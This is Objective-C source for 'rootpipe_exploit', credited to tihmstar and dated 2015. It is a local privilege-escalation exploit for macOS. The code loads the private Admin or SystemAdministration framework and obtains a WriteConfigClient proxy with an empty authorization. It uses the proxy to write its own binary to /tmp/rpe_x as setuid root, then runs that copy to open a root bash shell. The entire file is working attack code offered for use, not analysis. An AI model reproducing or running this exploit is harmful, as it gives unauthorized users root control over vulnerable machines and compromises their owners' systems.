//
//  main.m
//  rootpipe_exploit
//
//  Created by tihmstar on 13.04.15.
//  Copyright (c) 2015 tihmstar. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/objc-load.h>

@interface SFAuthorization : NSObject
+(id)authorization;
@end

@interface WriteConfigClient : NSObject
+(id)sharedClient;
-(void)authenticateUsingAuthorizationSync:(id)auth;
-(id)remoteProxy;
@end

@interface Proxy : NSObject;
-(void)createFileWithContents:(NSData*)data path:(NSString*)path attributes:(NSDictionary *)attributes;
@end


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSString *newPath = @"/tmp/rpe_x";
        
        //try
        if (!setuid(0)) {
            printf("Exploit succeeded, poping root shell\n");
            system("/bin/bash\n");
            [[NSFileManager defaultManager] removeItemAtPath:newPath error:nil];
            return 0;
        }
        
        printf("Running rootpipe exploit\n");

        NSString *selfpath = NSProcessInfo.processInfo.arguments[0];

        NSString *bPath = @"/System/Library/PrivateFrameworks/Admin.framework";
        
        printf("Loading framework\n");
        if (![[NSFileManager defaultManager] fileExistsAtPath:bPath]) {
            printf("[Warning] Admin.framework not found, trying to load SystemAdministration.framework\n");
            bPath = @"/System/Library/PrivateFrameworks/SystemAdministration.framework";
        }

        NSBundle *admin = [NSBundle bundleWithPath:bPath];
        if (![admin load]) {
            printf("[Error] loading framework\n");
            return -1;
        }
        
        Class sfauth = objc_lookUpClass("SFAuthorization");
        Class wcc = objc_lookUpClass("WriteConfigClient");
        
        if (!sfauth || !wcc) {
            printf("[Error] getting classes failed\n");
            return -1;
        }
        printf("Loaded successfully\n");
        
        
        SFAuthorization *auth = [sfauth authorization];
        WriteConfigClient *sharedClient = [wcc sharedClient];
        [sharedClient authenticateUsingAuthorizationSync: auth];
        Proxy *tool = [sharedClient remoteProxy];
        
        NSData *data = [NSData dataWithContentsOfFile:selfpath];
        
        printf("Getting suid flag\n");
        [tool createFileWithContents:data path:newPath attributes:@{ NSFilePosixPermissions : @04777 }];
        sleep(1);
        if (![[NSFileManager defaultManager] fileExistsAtPath:newPath]) {
            printf("[Error] creating file failed\n");
            return -1;
        }
        printf("Shell ready in...\n");
        printf("3\n");
        sleep(1);
        printf("2\n");
        sleep(1);
        printf("1\n");
        sleep(1);
        system([newPath UTF8String]);
    }
    return 0;
}
